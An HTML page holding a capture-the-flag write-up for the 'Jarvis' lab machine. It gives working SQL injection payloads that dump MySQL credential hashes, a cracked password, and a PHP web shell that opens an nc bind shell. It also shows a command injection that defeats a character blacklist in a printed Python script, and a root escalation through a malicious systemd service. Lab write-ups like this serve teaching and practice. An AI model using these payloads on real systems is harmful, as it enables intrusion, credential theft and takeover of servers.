<!DOCTYPE html5>
<html>
	<head>
		<title>jarvis | Holiday Hack 2019</title>
		<link rel="stylesheet" href="/css/common.css">
		<link rel="stylesheet" href="/css/writeup.css">
		<link rel="stylesheet" href="/css/pygments.css">
		<link rel="stylesheet" href="https://unpkg.com/normalize.css@8.0.1/normalize.css">
		
		<meta charset="utf-8" />
	</head>
	<body>
		<main>
			<h1>Jarvis</h1>
<p>As always, run an nmap scan:</p>
<div class="codehilite"><pre><span></span> $ nmap -A 10.10.10.135
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
    |_http-title: Stark Hotel
</pre></div>


<p>(trimmed)</p>
<p>Looking at the web server available, it's a simple listing page for a hotel. When you click a room, it takes you to <code>/room.php?cod=x</code> where x is presumably the room ID.</p>
<p>If you replace x with a string or an invalid id, the same page returns but all fields are blank. You can do a quick test for SQL injection with the following request:</p>
<div class="codehilite"><pre><span></span>GET /room.php?cod=999 OR 1=1;#
</pre></div>


<p>999 is an invalid ID (we assume), but we still get a room returned and shown to us, meaning this is vulnerable.</p>
<p>Since we're shown whatever the first row returned is, a <code>UNION select</code> should let us view any data we want with the right conditions. First, we need to match up the right amount of columns.</p>
<div class="codehilite"><pre><span></span>GET /room.php?cod=999 UNION SELECT 1,1,1,1; #
GET /room.php?cod=999 UNION SELECT 1,1,1,1,1; #
GET /room.php?cod=999 UNION SELECT 1,1,1,1,1,1; #
GET /room.php?cod=999 UNION SELECT 1,1,1,1,1,1,1; #
^^^ this one works
</pre></div>


<p>We get a similar page, but the price, name etc is all 1. Let's start by enumerating the databases:</p>
<div class="codehilite"><pre><span></span>GET /room.php?cod=0 UNION SELECT 1,GROUP_CONCAT(schema_name),1,1,1,1,1 FROM information_schema.schemata; #
</pre></div>


<p>For me, this set the name of the room to <code>aaa,hotel,information_schema,mysql,performance_schema</code>. We miss the first column because the id isn't directly visible in our page, and though it is reflected back at us through the image URL, it's easier to have it shown directly. <code>aaa</code> is a weird name, so it's probably someone else and not part of the box. It's safe to say the <code>hotel</code> database drives this website.</p>
<p>We can now start to look at the tables in our database:</p>
<div class="codehilite"><pre><span></span>GET /room.php?cod=0 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),1,1,1,1,1 FROM information_schema.tables; #
</pre></div>


<p>This gives us <code>room,ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS...</code>. So it looks like our database is just the one table and then the default mysql stuff.</p>
<p>What might be more useful though, is some credentials. We can access the <code>mysql.users</code> table just like any other, and dump the first username and password hash:</p>
<div class="codehilite"><pre><span></span>GET /room.php?cod=0 UNION SELECT 1,User,Password,1,1,1,1 FROM mysql.user; #
</pre></div>


<p>All this could've been done much more easily using <code>sqlmap</code>, but it's good to do it yourself sometimes. From this, we get something we can throw into john, or any other tool:</p>
<div class="codehilite"><pre><span></span>DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
</pre></div>


<div class="codehilite"><pre><span></span> $ john passwd
    Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 SSE2 4x])
    Proceeding with single, rules:Single
    Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
    Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist

    imissyou         (DBadmin)

    1g 0:00:00:00 DONE 2/3 (2019-09-14 20:50) 1.960g/s 6617p/s 6617c/s 6617C/s twilight..ashlee
    Use the &quot;--show&quot; option to display all of the cracked passwords reliably
    Session completed
</pre></div>


<p>(trimmed)</p>
<p>For context, the hash is in a format particular to MySql &gt; 4.1, with the * being used to specify that it's a newer version.</p>
<p>Now what? Well, whether you run dirb on the web root or just guess you should quickly find the phpMyAdmin installation which we can now access.</p>
<p>Now we need to get actual code execution. From the phpMyAdmin root, you can find a <code>README.md</code> file which states that it's running version 4.8.0. We can easily search for exploits and find <a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/">this</a> very well written guide. We could make a metasploit payload, and in most real-world situations we'd need to, but we can also try a much simpler approach:</p>
<div class="codehilite"><pre><span></span>select &quot;&lt;?php echo exec(&#39;nc -lvp 4444 -e /bin/bash&#39;); ?&gt;&quot;
</pre></div>


<p>This will create a bash shell bound to port 4444. Run it and sure enough, we can connect.</p>
<div class="codehilite"><pre><span></span> $ whoami
    www-data
 $ cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
    (trimmed)
</pre></div>


<p>So while we have <em>a</em> shell, it's likely pepper is the real user target. Let's do our normal enum of processes:</p>
<div class="codehilite"><pre><span></span> $ ps -aux
    USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    root          1  0.2  0.6 138984  6820 ?        Ss   15:39   0:08 /sbin/init
    root        562  0.0  2.5 271396 25648 ?        Ss   15:39   0:00 /usr/sbin/apache2 -k start
    www-data    917  0.0  0.3  18228  3376 pts/0    Ss+  15:45   0:00 /bin/bash
    root       1027  0.0  0.3  47608  3204 ?        S    16:02   0:00 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
    pepper     1028  0.0  0.9  26040  9128 ?        S    16:02   0:00 python3 /var/www/Admin-Utilities/simpler.py -p
    www-data   2203  0.0  0.0   4276   768 ?        S    16:26   0:00 sh -c nc -lvp 4444 -e /bin/bash
    www-data   2204  0.0  0.2  17940  2840 ?        S    16:26   0:00 bash
    www-data   2312  0.0  0.2  36632  2856 ?        R    16:27   0:00 ps -aux
</pre></div>


<p>(trimmed)</p>
<p>We see everything we'd expect: kernel threads, the http server and the shell we're on, but also a call to sudo which runs this python script as a target. Here's the source for that script:</p>
<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">listdir</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="k">def</span> <span class="nf">show_help</span><span class="p">():</span>
    <span class="n">message</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">********************************************************</span>
<span class="s1">* Simpler   -   A simple simplifier ;)                 *</span>
<span class="s1">* Version 1.0                                          *</span>
<span class="s1">********************************************************</span>
<span class="s1">Usage:  python3 simpler.py [options]</span>

<span class="s1">Options:</span>
<span class="s1">    -h/--help   : This help</span>
<span class="s1">    -s          : Statistics</span>
<span class="s1">    -l          : List the attackers IP</span>
<span class="s1">    -p          : ping an attacker IP</span>
<span class="s1">    &#39;&#39;&#39;</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show_header</span><span class="p">():</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;***********************************************</span>
<span class="s1">     _                 _                       </span>
<span class="s1"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ </span>
<span class="s1">/ __| | &#39;_ ` _ \| &#39;_ \| |/ _ \ &#39;__| &#39;_ \| | | |</span>
<span class="s1">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span>
<span class="s1">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span>
<span class="s1">                |_|               |_|    |___/ </span>
<span class="s1">                                @ironhackers.es</span>

<span class="s1">***********************************************</span>
<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show_statistics</span><span class="p">():</span>
    <span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/home/pepper/Web/Logs/&#39;</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Statistics</span><span class="se">\n</span><span class="s1">-----------&#39;</span><span class="p">)</span>
    <span class="n">listed_files</span> <span class="o">=</span> <span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="n">count</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">listed_files</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Number of Attackers: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">count</span><span class="p">))</span>
    <span class="n">level_1</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">dat</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">ip_list</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">reks</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="n">req</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="n">rek</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">listed_files</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
        <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
        <span class="n">level2</span><span class="p">,</span> <span class="n">rek</span> <span class="o">=</span> <span class="n">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
        <span class="n">fecha</span><span class="p">,</span> <span class="n">requ</span> <span class="o">=</span> <span class="n">date_to_num</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">fecha</span> <span class="o">&gt;</span> <span class="n">dat</span><span class="p">:</span>
            <span class="n">dat</span> <span class="o">=</span> <span class="n">fecha</span>
            <span class="n">req</span> <span class="o">=</span> <span class="n">requ</span>
            <span class="n">ip2</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">level2</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">level_1</span><span class="p">):</span>
            <span class="n">level_1</span> <span class="o">=</span> <span class="n">level2</span>
            <span class="n">ip_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">ip</span><span class="p">]</span>
            <span class="n">reks</span><span class="o">=</span><span class="p">[</span><span class="n">rek</span><span class="p">]</span>
        <span class="k">elif</span> <span class="nb">int</span><span class="p">(</span><span class="n">level2</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">(</span><span class="n">level_1</span><span class="p">):</span>
            <span class="n">ip_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
            <span class="n">reks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">rek</span><span class="p">)</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Most Risky:&#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ip_list</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;More than 1 ip found&#39;</span><span class="p">)</span>
    <span class="n">cont</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ip_list</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;    &#39;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s1">&#39; - Attack Level : &#39;</span> <span class="o">+</span> <span class="n">level_1</span> <span class="o">+</span> <span class="s1">&#39; Request: &#39;</span> <span class="o">+</span> <span class="n">reks</span><span class="p">[</span><span class="n">cont</span><span class="p">])</span>
        <span class="n">cont</span> <span class="o">=</span> <span class="n">cont</span> <span class="o">+</span> <span class="mi">1</span>

    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Most Recent: &#39;</span> <span class="o">+</span> <span class="n">ip2</span> <span class="o">+</span> <span class="s1">&#39; --&gt; &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">req</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">list_ip</span><span class="p">():</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Attackers</span><span class="se">\n</span><span class="s1">-----------&#39;</span><span class="p">)</span>
    <span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/home/pepper/Web/Logs/&#39;</span>
    <span class="n">listed_files</span> <span class="o">=</span> <span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">listed_files</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
        <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
        <span class="n">level</span><span class="p">,</span><span class="n">req</span> <span class="o">=</span> <span class="n">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; - Attack Level : &#39;</span> <span class="o">+</span> <span class="n">level</span><span class="p">)</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">date_to_num</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
    <span class="n">dat</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="n">req</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
        <span class="k">if</span> <span class="s1">&#39;Level&#39;</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
            <span class="n">fecha</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">7</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">regex</span> <span class="o">=</span> <span class="s1">&#39;(\d+)-(.*)-(\d+)(.*)&#39;</span>
            <span class="n">logEx</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span> <span class="n">fecha</span><span class="p">)</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span>
            <span class="n">mes</span> <span class="o">=</span> <span class="n">to_dict</span><span class="p">(</span><span class="n">logEx</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
            <span class="n">fecha</span> <span class="o">=</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="n">mes</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
            <span class="n">fecha</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">fecha</span><span class="p">,</span> <span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S&#39;</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">fecha</span> <span class="o">&gt;</span> <span class="n">dat</span><span class="p">:</span>
                <span class="n">dat</span> <span class="o">=</span> <span class="n">fecha</span>
                <span class="n">req</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">dat</span><span class="p">,</span> <span class="n">req</span>

<span class="k">def</span> <span class="nf">to_dict</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">month_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Jan&#39;</span><span class="p">:</span><span class="s1">&#39;01&#39;</span><span class="p">,</span><span class="s1">&#39;Feb&#39;</span><span class="p">:</span><span class="s1">&#39;02&#39;</span><span class="p">,</span><span class="s1">&#39;Mar&#39;</span><span class="p">:</span><span class="s1">&#39;03&#39;</span><span class="p">,</span><span class="s1">&#39;Apr&#39;</span><span class="p">:</span><span class="s1">&#39;04&#39;</span><span class="p">,</span> <span class="s1">&#39;May&#39;</span><span class="p">:</span><span class="s1">&#39;05&#39;</span><span class="p">,</span> <span class="s1">&#39;Jun&#39;</span><span class="p">:</span><span class="s1">&#39;06&#39;</span><span class="p">,</span><span class="s1">&#39;Jul&#39;</span><span class="p">:</span><span class="s1">&#39;07&#39;</span><span class="p">,</span><span class="s1">&#39;Aug&#39;</span><span class="p">:</span><span class="s1">&#39;08&#39;</span><span class="p">,</span><span class="s1">&#39;Sep&#39;</span><span class="p">:</span><span class="s1">&#39;09&#39;</span><span class="p">,</span><span class="s1">&#39;Oct&#39;</span><span class="p">:</span><span class="s1">&#39;10&#39;</span><span class="p">,</span><span class="s1">&#39;Nov&#39;</span><span class="p">:</span><span class="s1">&#39;11&#39;</span><span class="p">,</span><span class="s1">&#39;Dec&#39;</span><span class="p">:</span><span class="s1">&#39;12&#39;</span><span class="p">}</span>
    <span class="k">return</span> <span class="n">month_dict</span><span class="p">[</span><span class="n">name</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
    <span class="n">level</span><span class="o">=</span><span class="mi">0</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
        <span class="k">if</span> <span class="s1">&#39;Level&#39;</span> <span class="ow">in</span> <span class="n">j</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">4</span><span class="p">])</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">level</span><span class="p">):</span>
                <span class="n">level</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">4</span><span class="p">]</span>
                <span class="n">req</span><span class="o">=</span><span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">level</span><span class="p">,</span> <span class="n">req</span>

<span class="k">def</span> <span class="nf">exec_ping</span><span class="p">():</span>
    <span class="n">forbidden</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;||&#39;</span><span class="p">,</span> <span class="s1">&#39;|&#39;</span><span class="p">]</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Enter an IP: &#39;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">forbidden</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Got you&#39;</span><span class="p">)</span>
            <span class="n">exit</span><span class="p">()</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ping &#39;</span> <span class="o">+</span> <span class="n">command</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">show_header</span><span class="p">()</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">show_help</span><span class="p">()</span>
        <span class="n">exit</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-h&#39;</span> <span class="ow">or</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;--help&#39;</span><span class="p">:</span>
        <span class="n">show_help</span><span class="p">()</span>
        <span class="n">exit</span><span class="p">()</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-s&#39;</span><span class="p">:</span>
        <span class="n">show_statistics</span><span class="p">()</span>
        <span class="n">exit</span><span class="p">()</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-l&#39;</span><span class="p">:</span>
        <span class="n">list_ip</span><span class="p">()</span>
        <span class="n">exit</span><span class="p">()</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-p&#39;</span><span class="p">:</span>
        <span class="n">exec_ping</span><span class="p">()</span>
        <span class="n">exit</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">show_help</span><span class="p">()</span>
        <span class="n">exit</span><span class="p">()</span>
</pre></div>


<p>We see the -p flag, which our sudo process was using, passes input to a command. Whilst it may filter out some characters, it's still vulnerable to command injection.</p>
<p>We setup a simple bind shell as <code>/tmp/mal.sh</code>:</p>
<div class="codehilite"><pre><span></span>nc -lvp 5555 -e /bin/bash
</pre></div>


<div class="codehilite"><pre><span></span> $ sudo -u pepper python ./simpler.py -p
    Enter an IP: $(/tmp/mal.sh)
    &lt;hangs&gt;
</pre></div>


<p>Now we can connect to port 5555 and login as pepper, giving us our user flag. </p>
<p>Next, I added my ssh key to <code>~/.ssh/authorized_keys</code> to give me a proper SSH session, meaning editors, etc will work.</p>
<p>We've already looked through the processes before so it's unlikely to help us, we can look for SID bits though:</p>
<div class="codehilite"><pre><span></span> $ find / -perm -4000 -print 2&gt; /dev/null
    /bin/fusermount
    /bin/mount
    /bin/ping
    /bin/systemctl
    /bin/umount
    /bin/su
    /usr/bin/newgrp
    /usr/bin/passwd
    /usr/bin/gpasswd
    /usr/bin/chsh
    /usr/bin/sudo
    /usr/bin/chfn
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
</pre></div>


<p>The only odd one we see here is systemctl. This is used to control the systemd init system, which handles starting almost everything on the system, including managing long-running daemons.
Giving it an SUID bit means that anyone can control all parts of the init system. This gives us an easy path to root: We make a .service file that gives us a shell, then link it and ask systemctl to run it as a system process, ie as root:</p>
<div class="codehilite"><pre><span></span> $ cat mal.service
    [Service]
    ExecStart=/bin/bash -c &quot;nc -lvp 6666 -e /bin/bash&quot;
 $ systemctl link /home/pepper/mal.service
    Created symlink /etc/systemd/system/mal.service → /home/pepper/mal.service.
 $ systemctl start mal.service
</pre></div>


<p>We now have a root shell and can read the flag!</p>
		</main>

		<footer>
			<div class="links">
				<div>
					<a aria-label="Back" href="index.html">
						<span class="iconify" data-icon="fa:arrow-left"></span>
					</a>
				</div>
				<div>
			</div>
		</footer>

		<script src="https://code.iconify.design/1/1.0.3/iconify.min.js"></script>
	</body>
</html>